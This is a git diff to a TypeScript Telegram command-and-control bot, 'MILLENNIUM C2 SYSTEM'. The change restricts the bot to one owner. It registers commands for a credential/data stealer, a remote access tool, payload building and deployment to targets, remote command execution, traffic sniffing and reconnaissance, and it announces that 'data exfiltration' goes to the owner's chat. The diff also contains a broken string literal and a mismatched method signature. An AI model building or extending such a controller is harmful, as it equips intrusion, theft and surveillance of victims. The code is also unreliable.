@@ -5,6 +5,7 @@ import { Server as SocketIOServer } from 'socket.io';
 import fs from 'fs/promises';
 import path from 'path';
 import bcrypt from 'bcrypt';
+import crypto from 'crypto';
 
 interface BotUser {
   id: number;
@@ -32,22 +33,107 @@ class TelegramC2Controller {
   private io: SocketIOServer;
   private activeExecutions: Map<string, ToolExecution> = new Map();
   private snifferProcesses: Map<number, any> = new Map();
+  
+  // Owner security configuration
+  private readonly OWNER_CHAT_ID: number;
+  private readonly MASTER_BOT_TOKEN: string;
+  private readonly ENCRYPTION_KEY: string;
+  private readonly authorizedUsers: Set<number> = new Set();
 
   constructor(io: SocketIOServer) {
     this.io = io;
+    
+    // Initialize owner credentials from environment
+    this.OWNER_CHAT_ID = parseInt(process.env.TELEGRAM_OWNER_CHAT_ID || '0');
+    this.MASTER_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+    this.ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
+    
+    if (!this.OWNER_CHAT_ID || !this.MASTER_BOT_TOKEN) {
+      throw new Error('TELEGRAM_OWNER_CHAT_ID and TELEGRAM_BOT_TOKEN must be set in environment variables');
+    }
+    
+    // Add owner to authorized users
+    this.authorizedUsers.add(this.OWNER_CHAT_ID);
+    
+    console.log(`🔐 Telegram C2 Controller initialized for owner: ${this.OWNER_CHAT_ID}`);
     this.initializeBots();
+  }
+
+  // Validate if user is authorized
+  private isAuthorized(chatId: number): boolean {
+    return this.authorizedUsers.has(chatId) || chatId === this.OWNER_CHAT_ID;
+  }
+
+  // Encrypt sensitive data before sending
+  private encryptData(data: string): string {
+    const cipher = crypto.createCipher('aes-256-cbc', this.ENCRYPTION_KEY);
+    let encrypted = cipher.update(data, 'utf8', 'hex');
+    encrypted += cipher.final('hex');
+    return encrypted;
   }
 
   async initializeBots() {
     try {
-      const users = await storage.getTelegramUsers();
-      for (const user of users) {
-        if (user.active && user.botToken) {
-          await this.createBotInstance(user);
-        }
-      }
+      // Initialize only the master bot for owner
+      await this.createMasterBot();
     } catch (error) {
-      console.error('Failed to initialize Telegram bots:', error);
+      console.error('Failed to initialize Telegram bot:', error);
+    }
+  }
+
+  async createMasterBot() {
+    try {
+      const bot = new TelegramBot(this.MASTER_BOT_TOKEN, { polling: true });
+      
+      // Handle all messages with authorization check
+      bot.on('message', async (msg) => {
+        const chatId = msg.chat.id;
+        
+        if (!this.isAuthorized(chatId)) {
+          await bot.sendMessage(chatId, `
+🚫 **UNAUTHORIZED ACCESS ATTEMPT** 🚫
+
+This is a private security system.
+Access denied for chat ID: ${chatId}
+
+All unauthorized access attempts are logged.
+          `);
+          
+          // Log unauthorized access attempt
+          console.warn(`Unauthorized access attempt from chat ID: ${chatId}, username: ${msg.from?.username || 'unknown'}`);
+          await this.logSecurityEvent('unauthorized_access', { chatId, username: msg.from?.username });
+          return;
+        }
+
+        // Process authorized commands
+        await this.handleAuthorizedMessage(msg, bot);
+      });
+
+      // Set up enhanced command handlers for owner
+      this.setupOwnerCommands(bot);
+
+      console.log(`🤖 Master Telegram C2 Bot initialized for owner: ${this.OWNER_CHAT_ID}`);
+
+      // Send initialization message to owner
+      await bot.sendMessage(this.OWNER_CHAT_ID, `
+🚀 **MILLENNIUM C2 SYSTEM ONLINE** 🚀
+
+**Master Control Activated**
+**Operator:** OWNER
+**Security Level:** MAXIMUM
+**Chat ID:** ${this.OWNER_CHAT_ID}
+
+**🔐 SECURE CHANNEL ESTABLISHED** ✅
+
+All RAT operations, network sniffing, and data exfiltration will be directed exclusively to this chat.
+
+Type /help for command reference
+Type /status for system status
+      `, { parse_mode: 'Markdown' });
+
+    } catch (error) {
+      console.error('Failed to create master bot:', error);
+      throw error;
     }
   }
 
@@ -95,7 +181,76 @@ Type /help for command reference
     }
   }
 
-  async handleStart(msg: any, user?: BotUser) {
+  async handleAuthorizedMessage(msg: any, bot: TelegramBot) {
+    const text = msg.text || '';
+    const chatId = msg.chat.id;
+
+    try {
+      // Log all owner commands for audit
+      await this.logSecurityEvent('owner_command', { 
+        chatId, 
+        command: text, 
+        timestamp: new Date().toISOString() 
+      });
+
+      // Route commands
+      if (text.startsWith('/start')) await this.handleOwnerStart(msg, bot);
+      else if (text.startsWith('/status')) await this.handleOwnerStatus(msg, bot);
+      else if (text.startsWith('/sniffer')) await this.handleOwnerSniffer(msg, bot);
+      else if (text.startsWith('/stealer')) await this.handleOwnerStealer(msg, bot);
+      else if (text.startsWith('/rat')) await this.handleOwnerRAT(msg, bot);
+      else if (text.startsWith('/build')) await this.handleOwnerBuild(msg, bot);
+      else if (text.startsWith('/deploy')) await this.handleOwnerDeploy(msg, bot);
+      else if (text.startsWith('/execute')) await this.handleOwnerExecute(msg, bot);
+      else if (text.startsWith('/network')) await this.handleOwnerNetwork(msg, bot);
+      else if (text.startsWith('/logs')) await this.handleOwnerLogs(msg, bot);
+      else if (text.startsWith('/emergency')) await this.handleOwnerEmergency(msg, bot);
+      else if (text.startsWith('/help')) await this.handleOwnerHelp(msg, bot);
+      else if (text.startsWith('/authorize')) await this.handleAuthorizeUser(msg, bot);
+      else if (text.startsWith('/deauthorize')) await this.handleDeauthorizeUser(msg, bot);
+      else {
+        await bot.sendMessage(chatId, '❓ Unknown command. Type /help for available commands.');
+      }
+
+    } catch (error) {
+      console.error('Error handling authorized message:', error);
+      await bot.sendMessage(chatId, `❌ Command execution failed: ${error.message}`);
+    }
+  }
+
+  async logSecurityEvent(event: string, data: any) {
+    try {
+      await storage.logSecurityEvent({
+        event,
+        data: JSON.stringify(data),
+        timestamp: new Date(),
+        source: 'telegram_c2'
+      });
+    } catch (error) {
+      console.error('Failed to log security event:', error);
+    }
+  }
+
+  setupOwnerCommands(bot: TelegramBot) {
+    // Set bot commands for better UX
+    bot.setMyCommands([
+      { command: 'start', description: 'Initialize C2 system' },
+      { command: 'status', description: 'System status and statistics' },
+      { command: 'sniffer', description: 'Network traffic interception' },
+      { command: 'stealer', description: 'Data collection operations' },
+      { command: 'rat', description: 'Remote access tool control' },
+      { command: 'build', description: 'Payload generation' },
+      { command: 'deploy', description: 'Deploy payloads to targets' },
+      { command: 'execute', description: 'Remote command execution' },
+      { command: 'network', description: 'Network reconnaissance' },
+      { command: 'logs', description: 'View operation logs' },
+      { command: 'authorize', description: 'Authorize additional users' },
+      { command: 'emergency', description: 'Emergency shutdown' },
+      { command: 'help', description: 'Command reference' }
+    ]);
+  }
+
+  async handleOwnerStart(msg: any, bot: TelegramBot) {
     const chatId = msg.chat.id;
     const username = msg.from.username || `user_${msg.from.id}`;
     
@@ -643,7 +798,7 @@ Agents will auto-report to this chat upon connection.
     }
   }
 
-  async handleExecute(msg: any, user: BotUser) {
+  async handleExecute(msg: any, match: any, user: BotUser) {
     if (user.role === 'analyst') {
       const bot = this.bots.get(user.id);
       if (bot) {
@@ -952,7 +1107,7 @@ ${recentVisitors.slice(0, 3).map(v =>
   killExecution(executionId: string) {
     const execution = this.activeExecutions.get(executionId);
     if (execution) {
-      execution.status = 'failed';
+      execution.status = ''failed';
       execution.endTime = new Date();
       this.activeExecutions.delete(executionId);
       return true;
